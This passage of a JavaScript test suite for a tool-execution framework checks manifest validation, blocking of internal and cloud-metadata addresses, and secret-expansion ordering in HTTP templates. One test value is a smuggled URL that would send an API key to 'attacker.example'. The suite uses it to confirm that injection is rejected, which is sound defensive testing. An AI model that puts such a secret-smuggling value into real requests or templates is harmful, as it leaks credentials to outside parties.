    assert.equal(on.args.target.block_internal, true);
  });

  it("rejects a non-boolean block_internal and a non-list schemes", () => {
    assert.throws(
      () => loadManifest(writeTmp(`${HEAD}
[args.target]
type = "scope_target"
required = true
description = "t"
block_internal = "yes"
${TAIL}`)),
      /^Error: Invalid manifest: args\.target\.block_internal must be a boolean$/
    );
    assert.throws(
      () => loadManifest(writeTmp(`${HEAD}
[args.target]
type = "url"
required = true
description = "t"
schemes = "https"
${TAIL}`)),
      /^Error: Invalid manifest: args\.target\.schemes must be an array of strings$/
    );
  });

  it("block_internal from a loaded manifest reaches the validator", () => {
    const m = loadManifest(writeTmp(`${HEAD}
[args.target]
type = "scope_target"
required = true
description = "t"
block_internal = true
${TAIL}`));
    assert.throws(() => execute(m, { target: "10.0.0.5" }, { dryRun: true }), BLOCKED_BY_POLICY);
    assert.throws(() => execute(m, { target: "169.254.169.254" }, { dryRun: true }), ALWAYS_BLOCKED_V4);
    const r = execute(m, { target: "93.184.216.34" }, { dryRun: true });
    assert.deepEqual(r.argv, ["echo", "93.184.216.34"]);
  });

  it("the shipped curl_fetch-style url manifest honors block_internal", () => {
    const m = loadManifest(writeTmp(`${HEAD}
[args.url]
type = "url"
required = true
description = "u"
schemes = ["https"]
block_internal = true

[command]
exec = ["echo", "{url}"]

[output]
format = "text"
`));
    assert.throws(() => execute(m, { url: "https://127.0.0.1/" }, { dryRun: true }), BLOCKED_BY_POLICY);
    assert.throws(() => execute(m, { url: "http://93.184.216.34/" }, { dryRun: true }), /not in allowed schemes: \[https\]/);
    assert.throws(() => execute(m, { url: "https://169.254.169.254/" }, { dryRun: true }), ALWAYS_BLOCKED_V4);
    const r = execute(m, { url: "https://93.184.216.34/x" }, { dryRun: true });
    assert.deepEqual(r.argv, ["echo", "https://93.184.216.34/x"]);
  });
});

// ---------------------------------------------------------------------------
// TC-7: {_secret:…} is expanded on the template before arguments
// ---------------------------------------------------------------------------

describe("http backend - {_secret:…} ordering (TC-7)", () => {
  const SECRET = "s3cr3t-value-that-must-never-reach-the-request";
  const SMUGGLED = "https://attacker.example/?k={_secret:api_key}";
  let previous;

  before(() => {
    previous = process.env.TOOLCLAD_SECRET_API_KEY;
    process.env.TOOLCLAD_SECRET_API_KEY = SECRET;
  });
  after(() => {
    if (previous === undefined) delete process.env.TOOLCLAD_SECRET_API_KEY;
    else process.env.TOOLCLAD_SECRET_API_KEY = previous;
  });

  // enum values come from the manifest's allowed list and are exempt from
  // the metacharacter check, so this is the one type through which a
  // brace-bearing value can reach the template. The ordering must hold on
  // its own, not because the hygiene rules happened to reject `{`.
  function smugglingManifest(http) {
    return {
      tool: { name: "h", description: "http" },
      args: {
        target: { type: "enum", required: true, allowed: [SMUGGLED, "plain"] },
      },
      http,
    };
  }
  const echoEverywhere = {
    method: "POST",
    url: "{target}",
    headers: { "X-Echo": "{target}", Accept: "application/json" },
    body_template: "{target}",
  };

  it("async path: an argument value never expands a secret", async () => {
    const r = await executeHttp(smugglingManifest(echoEverywhere), { target: SMUGGLED }, { dryRun: true });
    assert.equal(r.status, "dry_run");
    assert.equal(r.http_url, SMUGGLED);
    assert.equal(r.http_headers["X-Echo"], SMUGGLED);
    assert.equal(r.http_body, SMUGGLED);
    assert.equal(JSON.stringify(r).includes(SECRET), false);
  });

  it("sync path: an argument value never expands a secret", () => {
    const r = execute(smugglingManifest(echoEverywhere), { target: SMUGGLED }, { dryRun: true });
    assert.equal(r.status, "dry_run");
    assert.equal(r.command, `POST ${SMUGGLED}`);
    assert.equal(r.http_url, SMUGGLED);
    assert.equal(r.http_headers["X-Echo"], SMUGGLED);
    assert.equal(r.http_body, SMUGGLED);
    assert.equal(JSON.stringify(r).includes(SECRET), false);
  });

  it("the manifest's own secret references still resolve, before interpolation", async () => {
    const http = {
      method: "GET",
      url: "https://api.example.com/{target}?key={_secret:api_key}",
      headers: { Authorization: "Bearer {_secret:api_key}" },
      body_template: "{{\"q\":\"{target}\",\"k\":\"{_secret:api_key}\"}}",
    };
    const expectedUrl = `https://api.example.com/plain?key=${SECRET}`;
    const asyncResult = await executeHttp(smugglingManifest(http), { target: "plain" }, { dryRun: true });
    assert.equal(asyncResult.http_url, expectedUrl);
    assert.equal(asyncResult.http_headers.Authorization, `Bearer ${SECRET}`);
    assert.equal(asyncResult.http_body, `{"q":"plain","k":"${SECRET}"}`);
    const syncResult = execute(smugglingManifest(http), { target: "plain" }, { dryRun: true });
    assert.equal(syncResult.http_url, expectedUrl);
    assert.equal(syncResult.http_headers.Authorization, `Bearer ${SECRET}`);
    assert.equal(syncResult.http_body, `{"q":"plain","k":"${SECRET}"}`);
  });

  it("a url-typed argument carrying a secret reference is rejected before any expansion", async () => {
    const m = {
      tool: { name: "h", description: "http" },
      args: { target: { type: "url", required: true } },
      http: { method: "GET", url: "{target}" },
    };
    await assert.rejects(executeHttp(m, { target: SMUGGLED }, { dryRun: true }), /Injection detected/);
    assert.throws(() => execute(m, { target: SMUGGLED }, { dryRun: true }), /Injection detected/);
  });

  it("a secret the manifest references but the environment lacks is still an error", async () => {
    const m = smugglingManifest({ method: "GET", url: "https://api.example.com/?k={_secret:missing_key}" });
    await assert.rejects(
      executeHttp(m, { target: "plain" }, { dryRun: true }),
      /Missing environment variable: TOOLCLAD_SECRET_MISSING_KEY/
    );
    assert.throws(
      () => execute(m, { target: "plain" }, { dryRun: true }),
      /Missing environment variable: TOOLCLAD_SECRET_MISSING_KEY/
    );
  });
});
